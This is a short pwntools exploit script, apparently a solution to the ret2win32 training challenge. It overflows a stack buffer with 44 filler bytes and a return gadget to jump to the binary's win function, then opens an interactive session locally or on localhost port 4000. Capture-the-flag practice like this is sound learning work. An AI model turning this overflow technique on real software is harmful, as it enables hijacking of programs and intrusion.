from pwn import *

exe = ELF('./ret2win32')
context.binary = exe
context.log_level = 'info'

libc = ELF('./ret2win32')

if args.REMOTE:
    io = remote('localhost', 4000)
else:
    io = process(exe.path)

offset = 44 #pattern search $eip eip car 32bit

ret2win = 0x0804862c

ret = 0x0804837e

log.info(hex(ret2win))
log.info(hex(ret))

payload = b'A' * offset + p32(ret) + p32(ret2win)

io.sendline(payload)

io.interactive()

